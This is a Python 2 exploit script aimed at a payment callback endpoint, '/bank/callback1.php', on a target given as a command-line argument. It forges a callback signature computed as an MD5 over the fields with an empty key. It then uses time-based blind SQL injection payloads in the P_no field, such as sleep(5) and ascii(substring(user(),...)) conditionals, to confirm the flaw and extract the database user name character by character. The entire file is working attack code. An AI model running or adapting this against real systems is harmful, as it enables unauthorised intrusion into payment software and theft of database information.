import json
import hashlib
import requests
import time
import sys

def md5(value): 
	m= hashlib.md5()
	m.update(value)
	return m.hexdigest()


def gen_data(P_no):
	value="P_address=aaa&P_attach=111&P_city=aaa&P_country=aaa&P_email=aaa&P_mobile=aaa&P_money=22222&P_name=aaaaa&P_no=%s&P_num=aaa&P_postcode=aaaa&P_price=aaaaaa&P_province=aaaa&P_qq=11111&P_remarks=22222&P_state=3333&P_time=4444&P_title=55555&P_type=666&P_url=7777&pkey=" %P_no
	data={
	"P_address":"aaa",
	"P_attach":"111",
	"P_city":"aaa",
	"P_country":"aaa",
	"P_email":"aaa",
	"P_mobile":"aaa",
	"P_money":"22222",
	"P_name":"aaaaa",
	"P_no":P_no,
	"P_num":"aaa",
	"P_postcode":"aaaa",
	"P_price":"aaaaaa",
	"P_province":"aaaa",
	"P_qq":"11111",
	"P_remarks":"22222",
	"P_state":"3333",
	"P_time":"4444",
	"P_title":"55555",
	"P_type":"666",
	"P_url":"7777",
	"sign":md5(value)
	}
	return data

def veriy():
	url=sys.argv[1]+'/bank/callback1.php'
	current_time=time.time()
	r1=requests.post(url=url,data=json.dumps(gen_data("1")),headers = {'Content-Type': 'application/json'})
	r=requests.post(url=url,data=json.dumps(gen_data("1' and sleep(5)#")),headers = {'Content-Type': 'application/json'})
	if time.time()-current_time>5 and 'success' in r.content:
		print '[*] vulunerbal'
		return True


if veriy():	
	user=''
	for x in xrange(1,30):
		url=sys.argv[1]+'/bank/callback1.php'
		current_time=time.time()
		r=requests.post(url=url,data=json.dumps(gen_data("1' and if(length(user())=%s,sleep(5),1)#" %x)),headers = {'Content-Type': 'application/json'})
		if time.time()-current_time>5 and 'success' in r.content:
			print '[*] user() length: %s' %x
			for y in xrange(1,x+1):
				for z in xrange(33,122):
					current_time=time.time()
					r=requests.post(url=url,data=json.dumps(gen_data("1' and if(ascii(substring(user(),%s,1))=%s,sleep(5),1)#" %(y,z))),headers = {'Content-Type': 'application/json'})
					if time.time()-current_time>5 and 'success' in r.content:
						print chr(z)
						user+=chr(z)
	print '[*]user():',user	
